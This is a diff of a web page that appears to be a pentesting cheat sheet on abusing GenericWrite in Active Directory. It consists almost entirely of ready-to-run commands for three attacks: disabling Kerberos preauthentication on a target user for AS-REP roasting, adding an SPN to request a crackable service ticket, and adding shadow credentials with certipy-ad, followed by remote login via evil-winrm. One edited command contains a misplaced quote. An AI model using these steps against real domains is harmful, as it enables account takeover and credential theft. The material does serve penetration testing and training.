@@ -9,50 +9,32 @@ tags: ["GenericWrite", "active driectory", "ad", "Windows"]
 {{< tab set1 tab1 active >}}Windows{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
-#### 1. Import PowerView.ps1 
-
-<div>
+#### 1. Import PowerView
 
 ```console
 . .\PowerView.ps1
 ```
 
-</div>
-
 #### 2. Check target user
-
-<div>
 
 ```console
 Get-DomainUser <TARGET_USER> | ConvertFrom-UACValue
 ```
 
-</div>
-
 #### 3. Add UF_DONT_REQUIRE_PREAUTH bit
-
-<div>
 
 ```console
 Set-DomainObject -Identity <TARGET_USER> -XOR @{useraccountcontrol=4194304} -Verbose
 ```
 
-</div>
-
 #### 4. AS-REP Roasting
-
-<div>
 
 ```console
 # In local linux machine
 impacket-GetNPUsers '<DOMAIN>/<USER>' -no-pass -dc-ip <DC>
 ```
 
-</div>
-
 {{< /tabcontent >}}
-
-<br>
 
 ---
 
@@ -61,19 +43,13 @@ impacket-GetNPUsers '<DOMAIN>/<USER>' -no-pass -dc-ip <DC>
 {{< tab set2 tab1 active >}}Windows{{< /tab >}}
 {{< tabcontent set2 tab1 >}}
 
-#### 1. Import PowerView.ps1
-
-<div>
+#### 1. Import PowerView
 
 ```console
 . .\PowerView.ps1
 ```
 
-</div>
-
-#### 2. Create cred object (runas) \[optional\]
-
-<div>
+#### 2. Create a cred object (runas) \[optional\]
 
 ```console
 $username = '<DOMAIN>\<USER>'
@@ -87,37 +63,25 @@ $password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force
 $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
 ```
 
-</div>
-
-#### 3. Add SPN
-
-<div>
+#### 3. Add a SPN
 
 ```console
-# Add spn (e.g. MSSQL)
-setspn -a MSSQLSvc/<TARGET_DOMAIN>:1433 <DOMAIN>\<TARGET_USER>
+# eg. MSSQLSvc/example.com:1433
+setspn -a '<SERVICE>/<TARGET_DOMAIN>:<SERVICE_PORT>' '<DOMAIN>\<TARGET_USER>'
 ```
 
 ```console
 # Check
-Get-DomainUser <TARGET_USER> | Select serviceprincipalname
+Get-DomainUser '<TARGET_USER>' | Select serviceprincipalname
 ```
-
-</div>
 
 #### 4. Get SPN
 
-<div>
-
 ```console
-Get-DomainSPNTicket -SPN "MSSQLSvc/<DOMAIN>:1433" -Credential $Cred
+Get-DomainSPNTicket -SPN '<SERVICE>/<TARGET_DOMAIN>:<SERVICE_PORT>' -Credential $Cred
 ```
 
-</div>
-
 {{< /tabcontent >}}
-
-<br>
 
 ---
 
@@ -126,35 +90,55 @@ Get-DomainSPNTicket -SPN "MSSQLSvc/<DOMAIN>:1433" -Credential $Cred
 {{< tab set3 tab1 active >}}Linux{{< /tab >}}
 {{< tabcontent set3 tab1 >}}
 
-<div>
+#### 1. Request a ticket
 
 ```console
-# Request a ticket
-kinit <USER>
+sudo ntpdate -s <DC> && impacket-getTGT '<DOMAIN>/<USER>'
 ```
 
+#### 2. Add shadow credentials
+
 ```console
-# Import ticket
-export KRB5CCNAME=/tmp/krb5cc_1000
+export KRB5CCNAME=<USER>.ccache
 ```
 
 ```console
 # Pre-check (Optional)
-certipy-ad find -username <USER>@<DOMAIN> -k -target <TARGET_DOMAIN>
+certipy-ad find -username '<USER>@<DOMAIN>' -k -target <TARGET_DOMAIN>
 ```
 
 ```console
 # Add shadow credentials
-certipy-ad shadow auto -username <USER>@<DOMAIN> -account <TARGET_USER> -k -target <TARGET_DOMAIN>
+certipy-ad shadow auto -username '<USER>@<DOMAIN'> -account <TARGET_USER> -k -target <TARGET_DOMAIN>
+```
+
+#### 3. Remote
+
+```console
+# Edit '/etc/krb5.conf' (All uppercase)
+[libdefaults]
+    default_realm = <DOMAIN>
+
+[realms]
+    <DOMAIN> = {
+        kdc = <DC>:88
+        admin_server = <DC>
+        default_domain = <DOMAIN>
+    }
+    
+[domain_realm]
+    .domain.internal = <DOMAIN>
+    domain.internal = <DOMAIN>
+```
+
+<br>
+
+```console
+export KRB5CCNAME=<TARGET_USER>.ccache
 ```
 
 ```console
-# Remote with kerberos
-KRB5CCNAME=./<TARGET_USER>.ccache evil-winrm -i <TARGET_DOMAIN> -r <DOMAIN>
+evil-winrm -i <TARGET_DOMAIN> -r <DOMAIN>
 ```
 
-</div>
-
 {{< /tabcontent >}}
-
-<br>
